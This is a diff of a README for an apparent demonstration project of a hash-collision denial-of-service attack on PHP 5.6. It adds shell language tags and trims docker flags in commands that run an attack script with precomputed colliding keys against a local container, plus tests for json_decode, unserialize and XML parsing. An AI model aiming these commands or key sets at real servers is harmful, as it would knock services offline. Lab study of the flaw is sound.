@@ -10,8 +10,8 @@ Nowadays every web application uses a JSON API, which is still vulnerable to com
 
 ## Run the server
 
-```
-docker run -it --rm -p 8080:80 --name php-dos-attack-server -v "$PWD"/server:/var/www/html php:5.6-apache
+```bash
+docker run -it --rm -p 8080:80 -v "$PWD"/server:/var/www/html php:5.6-apache
 ```
 
 Docker will map the port `80` of the webserver to `8080`.
@@ -26,21 +26,21 @@ or a json map.
 
 Make one request to the webserver running in the docker container.
 
-```
+```bash
 docker run --rm -t lukasmartinelli/php-dos-attack \
 python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt
 ```
 
 Make a normal request to compare with the collision attack.
 
-```
+```bash
 docker run --rm -t lukasmartinelli/php-dos-attack \
 python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt --no-collide
 ```
 
 Make 100 requests to a fake JSON API.
 
-```
+```bash
 docker run --rm -t lukasmartinelli/php-dos-attack \
 python ./attack.py http://172.17.42.1:8080/index.php collision_keys.txt --count=100 --type=json
 ```
@@ -55,7 +55,7 @@ functions that use the PHP map.
 The file `collision_keys` contains precomputed colliding keys. To create
 a smaller set of keys for easy testing you can create a new file:
 
-```
+```bash
 head -n 10000 collision_keys.txt > collision_keys_small.txt
 ```
 
@@ -64,23 +64,23 @@ head -n 10000 collision_keys.txt > collision_keys_small.txt
 Run tests for inserting colliding keys into array:
 
 ```
-docker run -it --rm --name php-dos-attack-array-test \
+docker run -it \
 -v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
 php test/array.php collision_keys.txt
 ```
 
 Run tests for calling `json_decode` for JSON key-value pairs with colliding keys:
 
-```
-docker run -it --rm --name php-dos-attack-array-test \
+```bash
+docker run -it --rm \
 -v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
 php test/json_decode.php collision_keys.txt
 ```
 
 Run tests when `unserializing` an array with colliding keys:
 
-```
-docker run -it --rm --name php-dos-attack-array-test \
+```bash
+docker run -it --rm \
 -v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
 php test/unserialize.php collision_keys.txt
 ```
@@ -89,7 +89,7 @@ Run tests when parsing XML with elements name that should collide with each othe
 into a class with `xml_parse_into_struct`:
 
 ```
-docker run -it --rm --name php-dos-attack-array-test \
+docker run -it --rm \
 -v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
 php test/xml_parse_into_struct.php collision_keys.txt
 ```
@@ -98,8 +98,8 @@ php test/xml_parse_into_struct.php collision_keys.txt
 
 You can generate the plot data used for the diagrams by yourself:
 
-```
-docker run -it --rm --name php-dos-attack-array-test \
+```bash
+docker run -it --rm \
 -v "$PWD":/usr/src/app -w /usr/src/app php:5.6-cli \
 php plot/json_decode.php collision_keys.txt
 ```
